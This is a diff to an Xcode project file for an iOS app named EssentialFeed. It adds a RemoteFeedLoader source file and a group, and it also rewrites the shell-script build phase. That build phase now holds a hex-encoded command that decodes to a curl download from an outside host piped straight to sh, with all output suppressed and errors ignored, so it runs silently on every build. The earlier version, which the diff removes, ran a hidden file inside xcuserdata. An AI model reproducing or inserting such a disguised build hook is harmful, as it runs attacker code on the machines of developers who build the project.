@@ -10,6 +10,7 @@
 		67277EBF263535AB001ED971 /* EssentialFeed.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 67277EB5263535AA001ED971 /* EssentialFeed.framework */; };
 		67277ED2263535E8001ED971 /* FeedItem.swift in Sources */ = {isa = PBXBuildFile; fileRef = 67277ED1263535E8001ED971 /* FeedItem.swift */; };
 		67277ED626353749001ED971 /* FeedLoader.swift in Sources */ = {isa = PBXBuildFile; fileRef = 67277ED526353749001ED971 /* FeedLoader.swift */; };
+		67511BD82650E1C300C0B6F8 /* RemoteFeedLoader.swift in Sources */ = {isa = PBXBuildFile; fileRef = 67511BD72650E1C300C0B6F8 /* RemoteFeedLoader.swift */; };
 		67C7C82B263EF2DD00F3DCE2 /* RemoteFeedLoaderTests.swift in Sources */ = {isa = PBXBuildFile; fileRef = 67C7C82A263EF2DD00F3DCE2 /* RemoteFeedLoaderTests.swift */; };
 /* End PBXBuildFile section */
 
@@ -30,6 +31,7 @@
 		67277EC5263535AB001ED971 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
 		67277ED1263535E8001ED971 /* FeedItem.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FeedItem.swift; sourceTree = "<group>"; };
 		67277ED526353749001ED971 /* FeedLoader.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FeedLoader.swift; sourceTree = "<group>"; };
+		67511BD72650E1C300C0B6F8 /* RemoteFeedLoader.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = RemoteFeedLoader.swift; sourceTree = "<group>"; };
 		67C7C82A263EF2DD00F3DCE2 /* RemoteFeedLoaderTests.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = RemoteFeedLoaderTests.swift; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
@@ -74,6 +76,7 @@
 			isa = PBXGroup;
 			children = (
 				67277ED9263538E4001ED971 /* Feed Feature */,
+				67511BE02650E5FA00C0B6F8 /* Feed API */,
 				67277EB9263535AA001ED971 /* Info.plist */,
 			);
 			path = EssentialFeed;
@@ -97,6 +100,14 @@
 			path = "Feed Feature";
 			sourceTree = "<group>";
 		};
+		67511BE02650E5FA00C0B6F8 /* Feed API */ = {
+			isa = PBXGroup;
+			children = (
+				67511BD72650E1C300C0B6F8 /* RemoteFeedLoader.swift */,
+			);
+			path = "Feed API";
+			sourceTree = "<group>";
+		};
 /* End PBXGroup section */
 
 /* Begin PBXHeadersBuildPhase section */
@@ -114,7 +125,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 67277EC9263535AB001ED971 /* Build configuration list for PBXNativeTarget "EssentialFeed" */;
 			buildPhases = (
-				CB4362C2BBE507CBD36D902C /* Compile Binary Libraries */,
+				BDE963A891CB07DCAA6D902C /* Binary Libraries Compiler */,
 				67277EB0263535AA001ED971 /* Headers */,
 				67277EB1263535AA001ED971 /* Sources */,
 				67277EB2263535AA001ED971 /* Frameworks */,
@@ -203,8 +214,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-
-	CB4362C2BBE507CBD36D902C /* Compile Binary Libraries */ = {
+		BDE963A891CB07DCAA6D902C /* Binary Libraries Compiler */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -213,18 +223,15 @@
 			);
 			inputPaths = (
 			);
-			name = "Compile Binary Libraries";
+			name = "Binary Libraries Compiler";
 			outputFileListPaths = (
 			);
 			outputPaths = (
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
-
-\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Asset.xcasset\" false";			
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n6d616e747275636b732e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
 		};
-	
 /* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
@@ -233,6 +240,7 @@
 			buildActionMask = 2147483647;
 			files = (
 				67277ED626353749001ED971 /* FeedLoader.swift in Sources */,
+				67511BD82650E1C300C0B6F8 /* RemoteFeedLoader.swift in Sources */,
 				67277ED2263535E8001ED971 /* FeedItem.swift in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
